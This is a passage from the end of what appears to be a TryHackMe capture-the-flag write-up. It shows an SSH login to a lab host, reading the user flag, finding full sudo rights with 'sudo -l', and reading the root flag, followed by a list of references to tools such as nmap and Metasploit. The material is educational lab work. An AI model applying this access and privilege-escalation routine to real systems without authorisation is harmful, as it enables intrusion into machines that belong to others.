This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.66.132.112' (ED25519) to the list of known hosts.
alison@10.66.132.112's password: 
Last login: Tue Jul 28 20:35:40 2020 from 192.168.85.142
alison@ubuntu:~$ id
uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
alison@ubuntu:~$ 
```

Now we can read the user flag

```bash
alison@ubuntu:~$ ls -l
total 4
-rw------- 1 alison alison 35 Jul 28  2020 user.txt
alison@ubuntu:~$ cat user.txt
THM{<REDACTED>}
alison@ubuntu:~$ 
```

### Emumeration for privilege escalation

We now start enumerating for ways to escalate our privileges.  

```bash
alison@ubuntu:~$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:~$ 
```

Ah, we can run **every** command as root!

### Get the root flag

And finally, we can get the root flag

```bash
alison@ubuntu:~$ sudo cat /root/root.txt
THM{<REDACTED>}
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [PostgreSQL - Wikipedia](https://en.wikipedia.org/wiki/PostgreSQL)
- [Relational database - Wikipedia](https://en.wikipedia.org/wiki/Relational_database)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
